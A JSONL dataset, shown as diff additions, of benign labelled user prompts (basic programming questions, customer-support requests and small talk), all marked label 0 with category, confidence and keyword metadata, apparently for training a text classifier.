+{"text": "Can you explain what is a database index?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.7323171496391296, "keywords": ["database", "index"]}
+{"text": "Hello, how are you?", "label": 0, "pattern": "technical_question", "category": "unknown", "subcategory": "unknown", "confidence": 0.9999504089355469, "keywords": []}
+{"text": "Tell me about REST API best practices", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999996542930603, "keywords": ["rest", "api"]}
+{"text": "How does authentication work?", "label": 0, "pattern": "educational", "category": "security_education", "subcategory": "general_security", "confidence": 0.9996249675750732, "keywords": ["authentication"]}
+{"text": "Tell me about REST API best practices", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999996542930603, "keywords": ["rest", "api"]}
+{"text": "How do I create a new branch in git?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9955427050590515, "keywords": ["git", "branch"]}
+{"text": "What is the purpose of environment variables?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984560012817383, "keywords": ["environment", "variable"]}
+{"text": "Tell me about REST API best practices", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999996542930603, "keywords": ["rest", "api"]}
+{"text": "How do I create a new branch in git?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9955427050590515, "keywords": ["git", "branch"]}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9980834722518921, "keywords": ["synchronous", "asynchronous"]}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9946553707122803, "keywords": ["python"]}
+{"text": "How do I sort an array in Java?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9880051016807556, "keywords": ["java"]}
+{"text": "How do I handle errors in Python?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9995669722557068, "keywords": ["python", "error"]}
+{"text": "Tell me about REST API best practices", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999996542930603, "keywords": ["rest", "api"]}
+{"text": "Tell me about REST API best practices", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999996542930603, "keywords": ["rest", "api"]}
+{"text": "Tell me about REST API best practices", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999996542930603, "keywords": ["rest", "api"]}
+{"text": "Explain git merge vs rebase", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9999232292175293, "keywords": ["git", "merge"]}
+{"text": "How does authentication work?", "label": 0, "pattern": "educational", "category": "security_education", "subcategory": "general_security", "confidence": 0.9996249675750732, "keywords": ["authentication"]}
+{"text": "How do I handle errors in Python?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9995669722557068, "keywords": ["python", "error"]}
+{"text": "How does caching improve performance?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9992676377296448, "keywords": ["caching"]}
+{"text": "How do I handle errors in Python?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9995669722557068, "keywords": ["python", "error"]}
+{"text": "What is the purpose of environment variables?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984560012817383, "keywords": ["environment", "variable"]}
+{"text": "What are the benefits of using Docker?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984320998191833, "keywords": ["docker"]}
+{"text": "Tell me about REST API best practices", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999996542930603, "keywords": ["rest", "api"]}
+{"text": "What is the purpose of environment variables?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984560012817383, "keywords": ["environment", "variable"]}
+{"text": "How does authentication work?", "label": 0, "pattern": "educational", "category": "security_education", "subcategory": "general_security", "confidence": 0.9996249675750732, "keywords": ["authentication"]}
+{"text": "What are the benefits of using Docker?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984320998191833, "keywords": ["docker"]}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9946553707122803, "keywords": ["python"]}
+{"text": "How do I sort an array in Java?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9880051016807556, "keywords": ["java"]}
+{"text": "Can you explain what is a database index?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.7323171496391296, "keywords": ["database", "index"]}
+{"text": "Explain git merge vs rebase", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9999232292175293, "keywords": ["git", "merge"]}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9890074729919434, "keywords": ["javascript", "java", "loop"]}
+{"text": "How do I create a new branch in git?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9955427050590515, "keywords": ["git", "branch"]}
+{"text": "Can you explain the MVC pattern?", "label": 0, "pattern": "technical_question", "category": "best_practice_question", "subcategory": "general", "confidence": 0.9911192059516907, "keywords": []}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9980834722518921, "keywords": ["synchronous", "asynchronous"]}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.997484564781189, "keywords": ["sql", "select"]}
+{"text": "Explain the concept of dependency injection", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999993085861206, "keywords": ["dependency"]}
+{"text": "Tell me about REST API best practices", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999996542930603, "keywords": ["rest", "api"]}
+{"text": "How do I create a new branch in git?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9955427050590515, "keywords": ["git", "branch"]}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9890074729919434, "keywords": ["javascript", "java", "loop"]}
+{"text": "How do I handle errors in Python?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9995669722557068, "keywords": ["python", "error"]}
+{"text": "How do I create a new branch in git?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9955427050590515, "keywords": ["git", "branch"]}
+{"text": "Can you explain what is a database index?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.7323171496391296, "keywords": ["database", "index"]}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9946553707122803, "keywords": ["python"]}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9946553707122803, "keywords": ["python"]}
+{"text": "Can you explain the MVC pattern?", "label": 0, "pattern": "technical_question", "category": "best_practice_question", "subcategory": "general", "confidence": 0.9911192059516907, "keywords": []}
+{"text": "What is the purpose of environment variables?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984560012817383, "keywords": ["environment", "variable"]}
+{"text": "How does authentication work?", "label": 0, "pattern": "educational", "category": "security_education", "subcategory": "general_security", "confidence": 0.9996249675750732, "keywords": ["authentication"]}
+{"text": "What are the benefits of using Docker?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984320998191833, "keywords": ["docker"]}
+{"text": "Can you explain what is a database index?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.7323171496391296, "keywords": ["database", "index"]}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9980834722518921, "keywords": ["synchronous", "asynchronous"]}
+{"text": "How do I create a new branch in git?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9955427050590515, "keywords": ["git", "branch"]}
+{"text": "How does caching improve performance?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9992676377296448, "keywords": ["caching"]}
+{"text": "How does caching improve performance?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9992676377296448, "keywords": ["caching"]}
+{"text": "Hello, how are you?", "label": 0, "pattern": "technical_question", "category": "unknown", "subcategory": "unknown", "confidence": 0.9999504089355469, "keywords": []}
+{"text": "What are the benefits of using Docker?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984320998191833, "keywords": ["docker"]}
+{"text": "Explain the concept of dependency injection", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999993085861206, "keywords": ["dependency"]}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.997484564781189, "keywords": ["sql", "select"]}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.997484564781189, "keywords": ["sql", "select"]}
+{"text": "How does authentication work?", "label": 0, "pattern": "educational", "category": "security_education", "subcategory": "general_security", "confidence": 0.9996249675750732, "keywords": ["authentication"]}
+{"text": "Explain the concept of dependency injection", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999993085861206, "keywords": ["dependency"]}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9890074729919434, "keywords": ["javascript", "java", "loop"]}
+{"text": "Can you explain what is a database index?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.7323171496391296, "keywords": ["database", "index"]}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.997484564781189, "keywords": ["sql", "select"]}
+{"text": "What are the benefits of using Docker?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984320998191833, "keywords": ["docker"]}
+{"text": "What are the benefits of using Docker?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984320998191833, "keywords": ["docker"]}
+{"text": "Explain the concept of dependency injection", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999993085861206, "keywords": ["dependency"]}
+{"text": "How do I create a new branch in git?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9955427050590515, "keywords": ["git", "branch"]}
+{"text": "Explain git merge vs rebase", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9999232292175293, "keywords": ["git", "merge"]}
+{"text": "What are the benefits of using Docker?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984320998191833, "keywords": ["docker"]}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.997484564781189, "keywords": ["sql", "select"]}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9997946619987488, "keywords": ["http", "https"]}
+{"text": "Explain git merge vs rebase", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9999232292175293, "keywords": ["git", "merge"]}
+{"text": "How do I sort an array in Java?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9880051016807556, "keywords": ["java"]}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9980834722518921, "keywords": ["synchronous", "asynchronous"]}
+{"text": "Explain the concept of dependency injection", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999993085861206, "keywords": ["dependency"]}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.997484564781189, "keywords": ["sql", "select"]}
+{"text": "Tell me about REST API best practices", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999996542930603, "keywords": ["rest", "api"]}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9997946619987488, "keywords": ["http", "https"]}
+{"text": "How does authentication work?", "label": 0, "pattern": "educational", "category": "security_education", "subcategory": "general_security", "confidence": 0.9996249675750732, "keywords": ["authentication"]}
+{"text": "Can you explain what is a database index?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.7323171496391296, "keywords": ["database", "index"]}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9946553707122803, "keywords": ["python"]}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9890074729919434, "keywords": ["javascript", "java", "loop"]}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9980834722518921, "keywords": ["synchronous", "asynchronous"]}
+{"text": "What is the purpose of environment variables?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984560012817383, "keywords": ["environment", "variable"]}
+{"text": "Can you explain the MVC pattern?", "label": 0, "pattern": "technical_question", "category": "best_practice_question", "subcategory": "general", "confidence": 0.9911192059516907, "keywords": []}
+{"text": "What is the purpose of environment variables?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984560012817383, "keywords": ["environment", "variable"]}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9997946619987488, "keywords": ["http", "https"]}
+{"text": "Explain the concept of dependency injection", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999993085861206, "keywords": ["dependency"]}
+{"text": "Hello, how are you?", "label": 0, "pattern": "technical_question", "category": "unknown", "subcategory": "unknown", "confidence": 0.9999504089355469, "keywords": []}
+{"text": "How do I sort an array in Java?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9880051016807556, "keywords": ["java"]}
+{"text": "Explain git merge vs rebase", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9999232292175293, "keywords": ["git", "merge"]}
+{"text": "Explain git merge vs rebase", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9999232292175293, "keywords": ["git", "merge"]}
+{"text": "How does caching improve performance?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9992676377296448, "keywords": ["caching"]}
+{"text": "What is the purpose of environment variables?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984560012817383, "keywords": ["environment", "variable"]}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9890074729919434, "keywords": ["javascript", "java", "loop"]}
+{"text": "What are the benefits of using Docker?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9984320998191833, "keywords": ["docker"]}
+{"text": "How do I sort an array in Java?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9880051016807556, "keywords": ["java"]}
+{"text": "How does authentication work?", "label": 0, "pattern": "educational", "category": "security_education", "subcategory": "general_security", "confidence": 0.9996249675750732, "keywords": ["authentication"]}
+{"text": "How do I sort an array in Java?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9880051016807556, "keywords": ["java"]}
+{"text": "How does authentication work?", "label": 0, "pattern": "educational", "category": "security_education", "subcategory": "general_security", "confidence": 0.9996249675750732, "keywords": ["authentication"]}
+{"text": "Explain the concept of dependency injection", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.999993085861206, "keywords": ["dependency"]}
+{"text": "How do I handle errors in Python?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9995669722557068, "keywords": ["python", "error"]}
+{"text": "Hello, how are you?", "label": 0, "pattern": "technical_question", "category": "unknown", "subcategory": "unknown", "confidence": 0.9999504089355469, "keywords": []}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9946553707122803, "keywords": ["python"]}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9890074729919434, "keywords": ["javascript", "java", "loop"]}
+{"text": "Can you explain what is a database index?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.7323171496391296, "keywords": ["database", "index"]}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9980834722518921, "keywords": ["synchronous", "asynchronous"]}
+{"text": "Explain git merge vs rebase", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9999232292175293, "keywords": ["git", "merge"]}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9997946619987488, "keywords": ["http", "https"]}
+{"text": "Can you explain what is a database index?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.7323171496391296, "keywords": ["database", "index"]}
+{"text": "How do I sort an array in Java?", "label": 0, "pattern": "technical_question", "category": "technical_question", "subcategory": "general_tech", "confidence": 0.9880051016807556, "keywords": ["java"]}
+{"text": "I have a billing question.", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "I'm happy with the quality.", "label": 0, "pattern": null, "category": "feedback", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "feedback"}}
+{"text": "What languages do you support?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "I have a billing question.", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "Can you explain the pricing? Thanks!", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "Hi, how long is the trial period?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "What payment methods do you accept? Thanks!", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "Can I get a demo? Thanks!", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "The response time is good. Thanks!", "label": 0, "pattern": null, "category": "feedback", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "feedback"}}
+{"text": "Have a great day.", "label": 0, "pattern": null, "category": "general_chat", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "general_chat"}}
+{"text": "I need help with my account.", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "Hi, i need help with my account.", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "hello, how are you?", "label": 0, "pattern": null, "category": "general_chat", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "general_chat"}}
+{"text": "The response time is good. Thanks!", "label": 0, "pattern": null, "category": "feedback", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "feedback"}}
+{"text": "Can you help me with something else?", "label": 0, "pattern": null, "category": "general_chat", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "general_chat"}}
+{"text": "That's interesting, tell me more.", "label": 0, "pattern": null, "category": "general_chat", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "general_chat"}}
+{"text": "I'm happy with the quality.", "label": 0, "pattern": null, "category": "feedback", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "feedback"}}
+{"text": "What are your business hours?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "What is your refund policy?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "I have a billing question. Thanks!", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "How do i contact support?", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "Is there a mobile app? Thanks!", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "Can you help me with setup.", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "What payment methods do you accept.", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "Hi, this meets my expectations.", "label": 0, "pattern": null, "category": "feedback", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "feedback"}}
+{"text": "Can you help me with setup.", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "Hi, hello, how are you?", "label": 0, "pattern": null, "category": "general_chat", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "general_chat"}}
+{"text": "Can I get a demo? Thanks!", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "I'm satisfied with the results.", "label": 0, "pattern": null, "category": "feedback", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "feedback"}}
+{"text": "How do I cancel my subscription.", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "Hello, how are you.", "label": 0, "pattern": null, "category": "general_chat", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "general_chat"}}
+{"text": "i'm satisfied with the results.", "label": 0, "pattern": null, "category": "feedback", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "feedback"}}
+{"text": "I forgot my password. Thanks!", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "I would recommend this to others.", "label": 0, "pattern": null, "category": "feedback", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "feedback"}}
+{"text": "Hi, where is your office located?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "Where can I find the documentation?", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "i need help with my account.", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "I need help with my account.", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "Hi, do you offer discounts?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "can you help me with something else?", "label": 0, "pattern": null, "category": "general_chat", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "general_chat"}}
+{"text": "Hi, how long is the trial period?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "Have a great day!", "label": 0, "pattern": null, "category": "general_chat", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "general_chat"}}
+{"text": "I'm satisfied with the results. Thanks!", "label": 0, "pattern": null, "category": "feedback", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "feedback"}}
+{"text": "Where is your office located.", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "can i get a demo?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "This is exactly what I needed.", "label": 0, "pattern": null, "category": "feedback", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "feedback"}}
+{"text": "Can I get a demo?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "I appreciate the assistance. Thanks!", "label": 0, "pattern": null, "category": "general_chat", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "general_chat"}}
+{"text": "good to know!", "label": 0, "pattern": null, "category": "general_chat", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "general_chat"}}
+{"text": "The documentation is clear.", "label": 0, "pattern": null, "category": "feedback", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "feedback"}}
+{"text": "How do i get started?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "Hi, how do i cancel my subscription?", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "I appreciate the assistance.", "label": 0, "pattern": null, "category": "general_chat", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "general_chat"}}
+{"text": "The response time is good.", "label": 0, "pattern": null, "category": "feedback", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "feedback"}}
+{"text": "That's interesting, tell me more.", "label": 0, "pattern": null, "category": "general_chat", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "general_chat"}}
+{"text": "Hi, how do i cancel my subscription?", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "Hi, where is your office located?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "do you offer discounts?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "Hi, how long is the trial period?", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "I need help with my account.", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
+{"text": "Is there a mobile app.", "label": 0, "pattern": null, "category": "non_technical", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "non_technical"}}
+{"text": "I forgot my password.", "label": 0, "pattern": null, "category": "support", "subcategory": "non_whitelist", "metadata": {"generated": true, "template_category": "support"}}
